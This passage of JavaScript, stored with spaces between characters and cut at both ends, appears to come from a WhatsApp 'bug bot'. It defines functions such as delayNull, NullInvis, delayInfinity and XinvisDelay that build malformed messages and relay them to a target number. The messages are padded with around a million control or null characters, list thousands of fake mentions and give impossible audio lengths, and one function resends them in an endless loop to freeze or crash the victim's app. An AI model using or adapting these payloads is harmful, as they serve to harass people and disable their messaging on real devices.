             w i d t h :   6 4 0 , 
             f i l e E n c S h a 2 5 6 :   " B q K q P u J g p j u N o 2 1 T w E S h v Y 4 a m a I K E v i + w X d I i d M t z O g = " , 
             d i r e c t P a t h : 
             " / v / t 6 2 . 7 1 6 1 - 2 4 / 1 3 1 5 8 9 6 9 _ 5 9 9 1 6 9 8 7 9 9 5 0 1 6 8 _ 4 0 0 5 7 9 8 4 1 5 0 4 7 3 5 6 7 1 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I X X q - P n u k 1 M C i e m _ V _ b r V e o m y l l n o 4 O 7 j i x i K s U d M z W y & o e = 6 8 1 8 8 C 2 9 & _ n c _ s i d = 5 e 0 3 e 0 " , 
             m e d i a K e y T i m e s t a m p :   " 1 7 4 3 8 4 8 7 0 3 " , 
             c o n t e x t I n f o :   { 
                 i s S a m p l e d :   t r u e , 
                 p a r t i c i p a n t :   t a r g e t , 
                 m e n t i o n e d J i d :   [ 
                     . . . A r r a y . f r o m ( 
                         {   l e n g t h :   1 9 0 0   } , 
                         ( )   = >   " 1 "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   5 0 0 0 0 0 0 )   +   " @ s . w h a t s a p p . n e t " 
                     ) , 
                 ] , 
                 r e m o t e J i d :   " X " , 
                 f o r w a r d i n g S c o r e :   1 0 0 , 
                 i s F o r w a r d e d :   t r u e , 
                 s t a n z a I d :   " 1 2 3 4 5 6 7 8 9 A B C D E F " , 
                 q u o t e d M e s s a g e :   { 
                     b u s i n e s s M e s s a g e F o r w a r d I n f o :   { 
                         b u s i n e s s O w n e r J i d :   " 0 @ s . w h a t s a p p . n e t " , 
                     } , 
                 } , 
             } , 
             s t r e a m i n g S i d e c a r :   " c b a M p E 1 7 L N V x k u C q / 6 / Z o f A w L k u 1 A E L 4 8 Y U 8 V x P n 1 D O F Y A 7 / K d V g Q x + O F f G 5 O K d L K P M = " , 
             t h u m b n a i l D i r e c t P a t h :   " / v / t 6 2 . 3 6 1 4 7 - 2 4 / 1 1 9 1 7 6 8 8 _ 1 0 3 4 4 9 1 1 4 2 0 7 5 7 7 8 _ 3 9 3 6 5 0 3 5 8 0 3 0 7 7 6 2 2 5 5 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I Y r r c x x o P D k 3 n 5 x x y A L N 0 D P b u O M m - H K K 5 R J G C p D H D e G q & o e = 6 8 1 8 5 D E B & _ n c _ s i d = 5 e 0 3 e 0 " , 
             t h u m b n a i l S h a 2 5 6 :   " Q A Q Q T j D g Y r b t y T H U Y J q 3 9 q s T L z P r U 2 Q i 9 c 9 n p E d T l D 4 = " , 
             t h u m b n a i l E n c S h a 2 5 6 :   " f H n M 2 M v H N R I 6 x C 7 R n A l d c y S h G E 5 q i G I 8 U H y 6 i e N n T 1 k = " , 
             } , 
         } ,   
         { 
             e p h e m e r a l E x p i r a t i o n :   0 , 
             f o r w a r d i n g S c o r e :   9 7 4 1 , 
             i s F o r w a r d e d :   t r u e , 
             f o n t :   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 9 9 9 9 9 9 9 ) , 
             b a c k g r o u n d :   " # "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   1 6 7 7 7 2 1 5 ) . t o S t r i n g ( 1 6 ) . p a d S t a r t ( 6 ,   " 9 9 9 9 9 9 9 9 " ) , 
         } 
     ) ; 
     
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         g r o u p S t a t u s M e s s a g e V 2 :   { 
             m e s s a g e :   V i d M e s s a g e . m e s s a g e , 
           } , 
         } ,   p t c p   ?   
         {   
             m e s s a g e I d :   V i d M e s s a g e . k e y . i d ,   
             p a r t i c i p a n t :   {   j i d :   t a r g e t   }   
         }   :   {   m e s s a g e I d :   V i d M e s s a g e . k e y . i d   } 
     ) ; 
     
     c o n s t   p a y l o a d   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
                     b o d y :   {   
                         t e x t :   " � �   -   � �   � �   � �   � � " ,   
                         f o r m a t :   " D E F A U L T "   
                     } , 
                     n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                         n a m e :   " a d d r e s s _ m e s s a g e " , 
                         p a r a m s J s o n :   " \ x 1 0 " . r e p e a t ( 1 0 4 5 0 0 0 ) , 
                         v e r s i o n :   3 
                     } , 
                     e n t r y P o i n t C o n v e r s i o n S o u r c e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " 
                     } , 
                 } , 
             } , 
         } , 
         { 
             e p h e m e r a l E x p i r a t i o n :   0 , 
             f o r w a r d i n g S c o r e :   9 7 4 1 , 
             i s F o r w a r d e d :   t r u e , 
             f o n t :   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 9 9 9 9 9 9 9 ) , 
             b a c k g r o u n d :   " # "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   1 6 7 7 7 2 1 5 ) . t o S t r i n g ( 1 6 ) . p a d S t a r t ( 6 ,   " 9 9 9 9 9 9 9 9 " ) , 
         } , 
     ) ; 
     
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         g r o u p S t a t u s M e s s a g e V 2 :   { 
             m e s s a g e :   p a y l o a d . m e s s a g e , 
           } , 
         } ,   p t c p   ?   
         {   
             m e s s a g e I d :   p a y l o a d . k e y . i d ,   
             p a r t i c i p a n t :   {   j i d :   t a r g e t   }   
         }   :   {   m e s s a g e I d :   p a y l o a d . k e y . i d   } 
     ) ; 
     
     c o n s t   p a y l o a d 2   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
                     b o d y :   {   
                         t e x t :   " \ n " ,   
                         f o r m a t :   " D E F A U L T "   
                     } , 
                     n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                         n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
                         p a r a m s J s o n :   " \ x 1 0 " . r e p e a t ( 1 0 4 5 0 0 0 ) , 
                         v e r s i o n :   3 , 
                     } , 
                     e n t r y P o i n t C o n v e r s i o n S o u r c e :   " c a l l _ p e r m i s s i o n _ m e s s a g e " 
                     } , 
                 } , 
             } , 
         } , 
         { 
             e p h e m e r a l E x p i r a t i o n :   0 , 
             f o r w a r d i n g S c o r e :   9 7 4 1 , 
             i s F o r w a r d e d :   t r u e , 
             f o n t :   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 9 9 9 9 9 9 9 ) , 
             b a c k g r o u n d :   " # "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   1 6 7 7 7 2 1 5 ) . t o S t r i n g ( 1 6 ) . p a d S t a r t ( 6 ,   " 9 9 9 9 9 9 9 9 " ) , 
         } , 
     ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         g r o u p S t a t u s M e s s a g e V 2 :   { 
             m e s s a g e :   p a y l o a d 2 . m e s s a g e , 
           } , 
         } ,   p t c p   ?   
         {   
             m e s s a g e I d :   p a y l o a d 2 . k e y . i d ,   
             p a r t i c i p a n t :   {   j i d :   t a r g e t   }   
         }   :   {   m e s s a g e I d :   p a y l o a d 2 . k e y . i d   } 
     ) ; 
 } 
         
         
 a s y n c   f u n c t i o n   Z e n o D e l a y P a y l o a d ( t a r g e t ,   p t c p   =   t r u e )   { 
     c o n s t   p a y l o a d   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
                     b o d y :   {   
                         t e x t :   " \ n " ,   
                         f o r m a t :   " D E F A U L T "   
                     } , 
                     n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                         n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
                         p a r a m s J s o n :   " \ x 1 0 " . r e p e a t ( 1 0 4 5 0 0 0 ) , 
                         v e r s i o n :   3 , 
                     } , 
                     e n t r y P o i n t C o n v e r s i o n S o u r c e :   " c a l l _ p e r m i s s i o n _ m e s s a g e " 
                     } , 
                 } , 
             } , 
         } , 
         { 
             e p h e m e r a l E x p i r a t i o n :   0 , 
             f o r w a r d i n g S c o r e :   9 7 4 1 , 
             i s F o r w a r d e d :   t r u e , 
             f o n t :   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 9 9 9 9 9 9 9 ) , 
             b a c k g r o u n d :   " # "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   1 6 7 7 7 2 1 5 ) . t o S t r i n g ( 1 6 ) . p a d S t a r t ( 6 ,   " 9 9 9 9 9 9 9 9 " ) , 
         } , 
     ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         g r o u p S t a t u s M e s s a g e V 2 :   { 
             m e s s a g e :   p a y l o a d . m e s s a g e , 
           } , 
         } ,   p t c p   ?   
         {   
             m e s s a g e I d :   p a y l o a d . k e y . i d ,   
             p a r t i c i p a n t :   {   j i d :   t a r g e t   }   
         }   :   {   m e s s a g e I d :   p a y l o a d . k e y . i d   } 
     ) ; 
     
     c o n s t   p a y l o a d 2   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
                     b o d y :   {   
                         t e x t :   " \ n " ,   
                         f o r m a t :   " D E F A U L T "   
                     } , 
                     n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                         n a m e :   " g a l a x y _ m e s s a g e " , 
                         p a r a m s J s o n :   " \ x 1 0 " . r e p e a t ( 1 0 4 5 0 0 0 ) , 
                         v e r s i o n :   3 
                     } , 
                     e n t r y P o i n t C o n v e r s i o n S o u r c e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " 
                     } , 
                 } , 
             } , 
         } , 
         { 
             e p h e m e r a l E x p i r a t i o n :   0 , 
             f o r w a r d i n g S c o r e :   9 7 4 1 , 
             i s F o r w a r d e d :   t r u e , 
             f o n t :   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 9 9 9 9 9 9 9 ) , 
             b a c k g r o u n d :   " # "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   1 6 7 7 7 2 1 5 ) . t o S t r i n g ( 1 6 ) . p a d S t a r t ( 6 ,   " 9 9 9 9 9 9 9 9 " ) , 
         } , 
     ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         g r o u p S t a t u s M e s s a g e V 2 :   { 
             m e s s a g e :   p a y l o a d 2 . m e s s a g e , 
           } , 
         } ,   p t c p   ?   
         {   
             m e s s a g e I d :   p a y l o a d 2 . k e y . i d ,   
             p a r t i c i p a n t :   {   j i d :   t a r g e t   }   
         }   :   {   m e s s a g e I d :   p a y l o a d 2 . k e y . i d   } 
     ) ; 
 } 
         
 
 a s y n c   f u n c t i o n   d e l a y N u l l ( t a r g e t )   { 
     l e t   m s g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
             b o d y :   { 
                 t e x t :   " D   |   7 e p p e l i - K i l l e r Q u e e n "   +   " ꦽ " . r e p e a t ( 7 0 0 0 ) , 
                 f o r m a t :   " D E F A U L T " 
             } , 
             n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                 n a m e :   " a d d r e s s _ m e s s a g e " , 
                 p a r a m s J s o n :   ` { \ " v a l u e s \ " : { \ " i n _ p i n _ c o d e \ " : \ " 9 9 9 9 9 9 \ " , \ " b u i l d i n g _ n a m e \ " : \ " s a o s i n x \ " , \ " l a n d m a r k _ a r e a \ " : \ " X \ " , \ " a d d r e s s \ " : \ " Y d 7 \ " , \ " t o w e r _ n u m b e r \ " : \ " Y 7 d \ " , \ " c i t y \ " : \ " c h i n d o \ " , \ " n a m e \ " : \ " d 7 y \ " , \ " p h o n e _ n u m b e r \ " : \ " 9 9 9 9 9 9 9 9 9 9 9 9 \ " , \ " h o u s e _ n u m b e r \ " : \ " x x x \ " , \ " f l o o r _ n u m b e r \ " : \ " x x x \ " , \ " s t a t e \ " : \ " X $ { " \ u 0 0 0 0 " . r e p e a t ( 9 0 0 0 0 0 ) } \ " } } ` , 
                 v e r s i o n :   3 
             } 
         } 
     } ,   {   u s e r J i d : t a r g e t   } ) ; 
     
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m s g . m e s s a g e ,   { 
         p a r t i c i p a n t :   {   j i d : t a r g e t   } ,   
         m e s s a g e I d :   m s g . k e y . i d 
     } )   
 } 
 
 a s y n c   f u n c t i o n   N u l l I n v i s ( t a r g e t )   { 
     l e t   m s g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
             c o n t e x t I n f o :   { 
                 m e n t i o n e d J i d :   A r r a y . f r o m ( {   l e n g t h : 2 0 0 0   } ,   ( _ ,   y )   = >   ` 1 3 1 3 5 5 5 0 0 0 $ { y   +   1 } @ s . w h a t s a p p . n e t ` ) 
             } ,   
             b o d y :   { 
                 t e x t :   " 7 e p p e l i   -   E x 3 c u t o r " , 
                 f o r m a t :   " D E F A U L T " 
             } , 
             n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                 n a m e :   " a d d r e s s _ m e s s a g e " , 
                 p a r a m s J s o n :   ` { \ " v a l u e s \ " : { \ " i n _ p i n _ c o d e \ " : \ " 9 9 9 9 9 9 \ " , \ " b u i l d i n g _ n a m e \ " : \ " s a o s i n x \ " , \ " l a n d m a r k _ a r e a \ " : \ " X \ " , \ " a d d r e s s \ " : \ " Y d 7 \ " , \ " t o w e r _ n u m b e r \ " : \ " Y 7 d \ " , \ " c i t y \ " : \ " c h i n d o \ " , \ " n a m e \ " : \ " d 7 y \ " , \ " p h o n e _ n u m b e r \ " : \ " 9 9 9 9 9 9 9 9 9 9 9 9 \ " , \ " h o u s e _ n u m b e r \ " : \ " x x x \ " , \ " f l o o r _ n u m b e r \ " : \ " x x x \ " , \ " s t a t e \ " : \ " D   |   $ { " \ u 0 0 0 0 " . r e p e a t ( 9 0 0 0 0 0 ) } \ " } } ` , 
                 v e r s i o n :   3 
             } 
         } 
     } ,   {   u s e r J i d : t a r g e t   } ) ; 
     
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g . m e s s a g e ,   { 
         m e s s a g e I d :   m s g . k e y . i d , 
         s t a t u s J i d L i s t :   [ t a r g e t ,   " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " ] , 
         a d d i t i o n a l N o d e s :   [ 
             { 
                 t a g :   " m e t a " , 
                 a t t r s :   { } , 
                 c o n t e n t :   [ 
                     { 
                         t a g :   " m e n t i o n e d _ u s e r s " , 
                         a t t r s :   { } , 
                         c o n t e n t :   [ 
                             { 
                                 t a g :   " t o " , 
                                 a t t r s :   {   j i d :   t a r g e t   } , 
                                 c o n t e n t :   u n d e f i n e d 
                             } 
                         ] 
                     } 
                 ] 
             } 
         ] 
     } ) ; 
 } 
 
 
 a s y n c   f u n c t i o n   d e l a y I n f i n i t y ( X e o n B o t I n c ,   t a r g e t ,   m e n t i o n   =   t r u e )   { 
     w h i l e   ( t r u e )   { 
         t r y   { 
             c o n s t   g e n e r a t e M e s s a g e   =   { 
                 v i e w O n c e M e s s a g e :   { 
                     m e s s a g e :   { 
                         i m a g e M e s s a g e :   { 
                             u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 1 8 - 2 4 / 3 1 0 7 7 5 8 7 _ 1 7 6 4 4 0 6 0 2 4 1 3 1 7 7 2 _ 5 7 3 5 8 7 8 8 7 5 0 5 2 1 9 8 0 5 3 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I R X V K m y U l O P - T S u r W 6 9 S w l v u g 7 f 5 f B 4 E f v 4 S _ C 6 T t H z k & o e = 6 8 0 E E 7 A 3 & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
                             m i m e t y p e :   " i m a g e / j p e g " , 
                             c a p t i o n :   " # 4 i z x v e l z E x e r c 1 s t . " , 
                             f i l e S h a 2 5 6 :   " B c m + a U 2 A 9 Q D x + E M u w m M l 9 D 5 6 M J O N 4 4 I g e j + c Q E Q 2 s y I = " , 
                             f i l e L e n g t h :   " 1 9 7 6 9 " , 
                             h e i g h t :   3 5 4 , 
                             w i d t h :   7 8 3 , 
                             m e d i a K e y :   " n 7 B f Z X o 3 w G / d i 5 V 9 f C + N w a u L 6 f D r L N / q 1 b i + E k W I V I A = " , 
                             f i l e E n c S h a 2 5 6 :   " L r L 3 2 s E i + n 1 O 1 f G r P m c d 0 t 0 O g F a S E f 2 i u g 9 W i A 3 z a M U = " , 
                             d i r e c t P a t h :   " / v / t 6 2 . 7 1 1 8 - 2 4 / 3 1 0 7 7 5 8 7 _ 1 7 6 4 4 0 6 0 2 4 1 3 1 7 7 2 _ 5 7 3 5 8 7 8 8 7 5 0 5 2 1 9 8 0 5 3 _ n . e n c " , 
                             m e d i a K e y T i m e s t a m p :   " 1 7 4 3 2 2 5 4 1 9 " , 
                             j p e g T h u m b n a i l :   n u l l , 
                             s c a n s S i d e c a r :   " m h 5 / Y m c A W y L t 5 H 2 q z Y 3 N t H r E t y M = " , 
                             s c a n L e n g t h s :   [ 2 4 3 7 ,   1 7 3 3 2 ] , 
                             c o n t e x t I n f o :   { 
                                 m e n t i o n e d J i d :   [ 
                                     " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " , 
                                     . . . A r r a y . f r o m ( 
                                         {   l e n g t h :   1 9 0 0   } , 
                                         ( )   = >   " 1 "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   7 0 0 0 0 0 0 )   +   " @ s . w h a t s a p p . n e t " 
                                     ) 
                                 ] , 
                                 i s S a m p l e d :   t r u e , 
                                 p a r t i c i p a n t :   t a r g e t , 
                                 r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
                                 f o r w a r d i n g S c o r e :   9 7 4 1 , 
                                 i s F o r w a r d e d :   t r u e 
                             } 
                         } 
                     } 
                 } 
             } ; 
 
             c o n s t   m s g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   g e n e r a t e M e s s a g e ,   { } ) ; 
 
             a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g . m e s s a g e ,   { 
                 m e s s a g e I d :   m s g . k e y . i d , 
                 s t a t u s J i d L i s t :   [ t a r g e t ] , 
                 a d d i t i o n a l N o d e s :   [ 
                     { 
                         t a g :   " m e t a " , 
                         a t t r s :   { } , 
                         c o n t e n t :   [ 
                             { 
                                 t a g :   " m e n t i o n e d _ u s e r s " , 
                                 a t t r s :   { } , 
                                 c o n t e n t :   [ 
                                     {   t a g :   " t o " ,   a t t r s :   {   j i d :   t a r g e t   } ,   c o n t e n t :   u n d e f i n e d   } 
                                 ] 
                             } 
                         ] 
                     } 
                 ] 
             } ) ; 
 
             i f   ( m e n t i o n )   { 
                 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( 
                     t a r g e t , 
                     { 
                         s t a t u s M e n t i o n M e s s a g e :   { 
                             m e s s a g e :   { 
                                 p r o t o c o l M e s s a g e :   { 
                                     k e y :   m s g . k e y , 
                                     t y p e :   2 5 
                                 } 
                             } 
                         } 
                     } , 
                     { 
                         a d d i t i o n a l N o d e s :   [ 
                             { 
                                 t a g :   " m e t a " , 
                                 a t t r s :   {   i s _ s t a t u s _ m e n t i o n :   " —   \ u 0 0 0 0 "   } , 
                                 c o n t e n t :   u n d e f i n e d 
                             } 
                         ] 
                     } 
                 ) ; 
             } 
             a w a i t   n e w   P r o m i s e ( r e s o l v e   = >   s e t T i m e o u t ( r e s o l v e ,   9 0 0 0 ) ) ; 
         }   c a t c h   ( e r r )   { 
             a w a i t   n e w   P r o m i s e ( r e s o l v e   = >   s e t T i m e o u t ( r e s o l v e ,   5 0 0 0 ) ) ; 
         } 
     } 
 } 
 
 a s y n c   f u n c t i o n   X i n v i s D e l a y ( t a r g e t ,   m e n t i o n   =   t r u e )   { 
     c o n s t   A u d i o V s   =   { 
         m e s s a g e :   { 
             e p h e m e r a l M e s s a g e :   { 
                 m e s s a g e :   { 
                     a u d i o M e s s a g e :   { 
                         u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 1 4 - 2 4 / 3 0 5 7 8 2 2 6 _ 1 1 6 8 4 3 2 8 8 1 2 9 8 3 2 9 _ 9 6 8 4 5 7 5 4 7 2 0 0 3 7 6 1 7 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I N R q U 0 f 6 8 t T X D J q 5 X Q s B L 2 x x R Y p x y F 4 O F a O 0 7 X t N B I U J & o e = 6 7 C 0 E 4 9 E & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
                         m i m e t y p e :   " a u d i o / m p e g " , 
                         f i l e S h a 2 5 6 :   " O N 2 s 5 k S t l 3 1 4 o E r h 7 V S S t o y N 8 U 6 U y v o b D F d 5 6 7 H + 1 t 0 = " , 
                         f i l e L e n g t h :   9 9 9 9 9 9 9 9 9 9 9 9 9 9 , 
                         s e c o n d s :   9 9 9 9 9 9 9 9 9 9 9 9 9 9 , 
                         p t t :   t r u e , 
                         m e d i a K e y :   " + 3 T g 4 J G 4 y 5 S y C h 9 z E Z c s W n k 8 y d d a G E A L / 8 g F J G C 7 j G E = " , 
                         f i l e E n c S h a 2 5 6 :   " i M F U z Y K V z i m B a d 6 D M e u x 2 U O 1 0 z K S Z d F g 9 P k v R t i L 4 z w = " , 
                         d i r e c t P a t h :   " / v / t 6 2 . 7 1 1 4 - 2 4 / 3 0 5 7 8 2 2 6 _ 1 1 6 8 4 3 2 8 8 1 2 9 8 3 2 9 _ 9 6 8 4 5 7 5 4 7 2 0 0 3 7 6 1 7 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I N R q U 0 f 6 8 t T X D J q 5 X Q s B L 2 x x R Y p x y F 4 O F a O 0 7 X t N B I U J & o e = 6 7 C 0 E 4 9 E & _ n c _ s i d = 5 e 0 3 e 0 " , 
                         m e d i a K e y T i m e s t a m p :   9 9 9 9 9 9 9 9 9 9 9 9 9 9 , 
                         c o n t e x t I n f o :   { 
                             m e n t i o n e d J i d :   [ 
                                 " @ s . w h a t s a p p . n e t " , 
                                 . . . A r r a y . f r o m ( {   l e n g t h :   1 9 0 0   } ,   ( )   = > 
                                     ` 1 $ { M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 0 0 0 0 0 0 0 ) } @ s . w h a t s a p p . n e t ` 
                                 ) 
                             ] , 
                             i s F o r w a r d e d :   t r u e , 
                             f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                                 n e w s l e t t e r J i d :   " 1 2 0 3 6 3 3 7 5 4 2 7 6 2 5 7 6 4 @ n e w s l e t t e r " , 
                                 s e r v e r M e s s a g e I d :   1 , 
                                 n e w s l e t t e r N a m e :   " " 
                             } 
                         } , 
                         w a v e f o r m :   " A A A A I R s e C V t c W l x e W 1 V d X V h Z D B 0 9 S D V N T E V L W 0 Q J E j 1 J R k 9 G R y s 3 F A 8 A H l p f X V 9 e L 0 B X L 1 M n P h w + D B B c L U 9 N G g = = " 
                     } 
                 } 
             } 
         } 
     } ; 
 
     c o n s t   m s g 1   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   A u d i o V s . m e s s a g e ,   {   u s e r J i d :   t a r g e t   } ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g 1 . m e s s a g e ,   { 
         m e s s a g e I d :   m s g 1 . k e y . i d , 
         s t a t u s J i d L i s t :   [ t a r g e t ] , 
         a d d i t i o n a l N o d e s :   [ 
             { 
                 t a g :   " m e t a " , 
                 a t t r s :   { } , 
                 c o n t e n t :   [ 
                     { 
                         t a g :   " m e n t i o n e d _ u s e r s " , 
                         a t t r s :   { } , 
                         c o n t e n t :   [ 
                             {   t a g :   " t o " ,   a t t r s :   {   j i d :   t a r g e t   } ,   c o n t e n t :   u n d e f i n e d   } 
                         ] 
                     } 
                 ] 
             } 
         ] 
     } ) ; 
 
     i f   ( m e n t i o n )   { 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
             g r o u p S t a t u s M e n t i o n M e s s a g e :   { 
                 m e s s a g e :   { 
                     p r o t o c o l M e s s a g e :   { 
                         k e y :   m s g 1 . k e y , 
                         t y p e :   2 5 
                     } 
                 } 
             } 
         } ,   { 
             a d d i t i o n a l N o d e s :   [ { 
                 t a g :   " m e t a " , 
                 a t t r s :   { 
                     i s _ s t a t u s _ m e n t i o n :   t r u e 
                 } , 
                 c o n t e n t :   u n d e f i n e d 
             } ] 
         } ) ; 
     } 
 
     l e t   m s g 2   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         b u t t o n s M e s s a g e :   { 
             t e x t :   " " , 
             c o n t e n t T e x t :   " " , 
             f o o t e r T e x t :   " " , 
             b u t t o n s :   [ 
                 { 
                     b u t t o n I d :   " " , 
                     b u t t o n T e x t :   { 
                         d i s p l a y T e x t :   " "   +   " \ u 0 0 0 0 " . r e p e a t ( 8 0 0 0 0 0 ) , 
                     } , 
                     t y p e :   1 , 
                 } , 
             ] , 
             h e a d e r T y p e :   1 , 
         } , 
     } ,   { } ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g 2 . m e s s a g e ,   { 
         m e s s a g e I d :   m s g 2 . k e y . i d , 
         s t a t u s J i d L i s t :   [ t a r g e t ] , 
         a d d i t i o n a l N o d e s :   [ 
             { 
                 t a g :   " m e t a " , 
                 a t t r s :   { } , 
                 c o n t e n t :   [ 
                     { 
                         t a g :   " m e n t i o n e d _ u s e r s " , 
                         a t t r s :   { } , 
                         c o n t e n t :   [ 
                             { 
                                 t a g :   " t o " , 
                                 a t t r s :   {   j i d :   t a r g e t   } , 
                                 c o n t e n t :   u n d e f i n e d , 
                             } , 
                         ] , 
                     } , 
                 ] , 
             } , 
         ] , 
     } ) ; 
 
     i f   ( m e n t i o n )   { 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( 
             t a r g e t , 
             { 
                 g r o u p S t a t u s M e n t i o n M e s s a g e :   { 
                     m e s s a g e :   { 
                         p r o t o c o l M e s s a g e :   { 
                             k e y :   m s g 2 . k e y , 
                             t y p e :   2 5 , 
                         } , 
                     } , 
                 } , 
             } , 
             { 
                 a d d i t i o n a l N o d e s :   [ 
                     { 
                         t a g :   " m e t a " , 
                         a t t r s :   {   i s _ s t a t u s _ m e n t i o n :   t r u e   } , 
                         c o n t e n t :   u n d e f i n e d , 
                     } , 
                 ] , 
             } 
         ) ; 
     } 
 } 
 
 a s y n c   f u n c t i o n   I n v i s H a r d n e w ( t a r g e t ,   m e n t i o n   =   t r u e )   { 
                         l e t   m s g   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
                                 b u t t o n s M e s s a g e :   { 
                                         t e x t :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) " , 
                                         c o n t e n t T e x t : 
                                                 "   " , 
                                         f o o t e r T e x t :   "   " , 
                                         b u t t o n s :   [ 
                                                 { 
                                                         b u t t o n I d :   " z i e e " , 
                                                         b u t t o n T e x t :   { 
                                                                 d i s p l a y T e x t :   " \ u 0 0 0 0 " . r e p e a t ( 8 0 0 0 0 0 ) , 
                                                         } , 
                                                         t y p e :   1 , 
                                                 } , 
                                         ] , 
                                         h e a d e r T y p e :   1 , 
                                 } , 
                         } ,   { } ) ; 
                 
                         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g . m e s s a g e ,   { 
                                 m e s s a g e I d :   m s g . k e y . i d , 
                                 s t a t u s J i d L i s t :   [ t a r g e t ] , 
                                 a d d i t i o n a l N o d e s :   [ 
                                         { 
                                                 t a g :   " m e t a " , 
                                                 a t t r s :   { } , 
                                                 c o n t e n t :   [ 
                                                         { 
                                                                 t a g :   " m e n t i o n e d _ u s e r s " , 
                                                                 a t t r s :   { } , 
                                                                 c o n t e n t :   [ 
                                                                         { 
                                                                                 t a g :   " t o " , 
                                                                                 a t t r s :   {   j i d :   t a r g e t   } , 
                                                                                 c o n t e n t :   u n d e f i n e d , 
                                                                         } , 
                                                                 ] , 
                                                         } , 
                                                 ] , 
                                         } , 
                                 ] , 
                         } ) ; 
                         i f   ( m e n t i o n )   { 
                                 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( 
                                         t a r g e t , 
                                         { 
                                                 g r o u p S t a t u s M e n t i o n M e s s a g e :   { 
                                                         m e s s a g e :   { 
                                                                 p r o t o c o l M e s s a g e :   { 
                                                                         k e y :   m s g . k e y , 
                                                                         t y p e :   2 5 , 
